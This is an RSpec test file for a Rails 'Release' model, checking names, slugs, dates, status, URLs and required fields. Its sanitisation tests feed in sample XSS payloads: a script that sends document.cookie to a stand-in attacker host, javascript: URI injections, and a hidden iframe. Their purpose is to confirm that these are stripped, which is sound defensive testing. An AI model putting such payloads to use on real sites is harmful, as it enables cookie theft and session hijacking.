require 'spec_helper'

describe Release do

	let(:release) { create(:release)}

	describe "basic information" do
		it ".all returns a list of campaigns" do
			release.save
			expect(Release.all.count).not_to eq 0
		end

		it "should create a new instance given valid attributes" do
			expect(release).to be_valid
		end
	end

	describe "name" do

		it "should have a name" do
			expect(release).to respond_to(:name)
		end

		it "should return a default name if nil supplied" do
			release.name = nil
			release.save
			expected_name = "Distribution #{release.id}"
			expect(release.name).to eq expected_name
		end

		it "should return a default name if blank supplied" do
			release.name = ""
			release.save
			expected_name = "Distribution #{release.id}"
			expect(release.name).to eq expected_name
		end
	end

	describe "slug" do

		it "should have a slug attribute" do
			expect(release).to respond_to(:slug)
		end

		it "should change when name changes" do
			release.save
			current_slug = release.slug
			release.name = release.name + "y"
			release.save
			next_slug = release.slug
			expect(current_slug).not_to eq next_slug
		end
	end

	describe "duration" do

		it "should have a start date" do
			expect(release).to respond_to(:start_date)
		end

		it "should have an end date" do
			expect(release).to respond_to(:end_date)
		end

		it "should require a start date" do
			release.start_date = nil
			expect(release).not_to be_valid
		end

		it "should not allow a blank start date" do
			release.start_date = ""
			expect(release).not_to be_valid
		end

		it "should not allow a start date before today" do 
			release.start_date = Time.now - 1.day 
			expect(release).not_to be_valid
		end

		it "should require the start to before the end date" do
			release.end_date = release.start_date - 30.days
			expect(release).not_to be_valid
		end

		it "should have an end date of 365 days after start date after save" do 
			release.start_date = Time.now
			release.save
			expected = release.start_date + 365.days
			expect(expected).to eq release.end_date
		end
	end

	describe "user access" do

		it "should allow the creator to be set" do
			expect(release).to respond_to(:creator)
		end

		it "should not be valid without a user" do
			release.creator_id = nil
			expect(release).not_to be_valid
		end
	end

	describe "headline" do
		it "should have a headline" do
			expect(release).to respond_to(:headline)
		end

		it "should be valid with blank headline" do
			release.headline = ""
			expect(release).to be_valid
		end

		# Maybe more validations
	end

	describe "status" do
		it "should have a status" do
			expect(release).to respond_to(:status)
		end

		it "should be draft when created" do
			expect(release.status).to eq "draft"
		end

		it "should be template if changed to template" do
			release.isTemplate = true
			release.save
			expect(release.status).to eq "template"
		end

		it "should be draft if changed from template" do
			release.isTemplate = true
			release.save
			release.isTemplate = false
			release.save
			expect(release.status).to eq "draft"
		end

	end

	describe "copy" do
		it "should have a copy" do
			expect(release).to respond_to(:copy)
		end

		it "should be valid with empty copy" do
			release.copy = ""
			expect(release).to be_valid
		end

		it "should strip out script tags" do
			release.copy = '<script>document.write(\'<img src="http://www.attacker.com/\' + document.cookie + \'">\');</script><h1>I am a golden god</h1>'
			release.save
			expect(release.copy).to eq "<h1>I am a golden god</h1>"
		end

		it "should strip injected scripts" do
			release.copy = '<img src=javascript:alert("Hello")><table background="javascript:alert("Hello")">'
			release.save
			expect(release.copy).to eq "<img src=alert(\"Hello\")><table background=\"alert(\"Hello\")\">"
		end

		it "should remove iframes" do
			release.copy = '<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>'
			release.save
			expect(release.copy).to eq ""
		end
	end

	describe "url" do
		it "should have a url" do
			expect(release).to respond_to(:url)
		end

		it "should be valid if blank" do
			release.url = ""
			release.save
			expect(release).to be_valid
		end

		it "should be valid for existing url" do
			expect(release).to be_valid
		end

		it "should be invalid for a non-existant url" do
			release.url = "http://is.not.com"
			expect(release).not_to be_valid
		end

		it "should be invalid for a malformed url" do
			release.url = "this.is.not.com"
			expect(release).not_to be_valid
		end
	end

	describe "isTemplate" do
		it "should have an isTemplate" do
			expect(release).to respond_to(:isTemplate)
		end

		it "should return a draft copy of a Release if a template Release" do
			user = create(:user)
			release.isTemplate = true
			new_release = Release.new
			new_release.copy_it(user,release)
			expect(new_release.copy).to eq release.copy
			expect(new_release.status).to eq "draft"
			expect(new_release.headline).to eq release.headline
			expect(new_release.creator).to eq user
		end
	end

	describe "brand" do
		it "should have a brand" do
			expect(release).to respond_to(:brand)
		end

		it "should not allow a nil brand" do
			release.brand = nil
			expect(release).not_to be_valid
		end
	end

	describe "industry" do
		it "should have an industry" do 
			expect(release).to respond_to(:industry)
		end

		it "should not allow industry to be nil on update" do
			release.save
			release.industry_id = nil
			expect(release).not_to be_valid
		end
	end

	describe "subindustry" do
		it "should have a subindustry" do 
			expect(release).to respond_to(:subindustry)
		end

		it "should not allow subindustry to be nil on update" do 
			release.save
			release.subindustry_id = nil
			expect(release).not_to be_valid
		end
	end

	describe "type" do 
		it "should have a type" do 
			expect(release).to respond_to(:retype)
		end

		it "should not allow type to be nil on update" do 
			release.save
			release.retype = nil 
			expect(release).not_to be_valid
		end
	end
end
